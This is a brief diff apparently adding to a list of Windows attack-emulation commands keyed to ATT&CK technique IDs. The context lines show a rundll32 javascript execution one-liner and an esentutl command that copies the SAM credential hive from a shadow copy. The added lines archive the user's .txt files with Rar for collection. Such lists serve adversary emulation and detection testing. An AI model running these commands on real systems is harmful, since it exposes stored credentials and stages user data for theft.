@@ -251,6 +251,10 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
 
 esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
 
+*********
+
+"%programfiles%/WinRAR/Rar.exe" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt
+
 
 
 
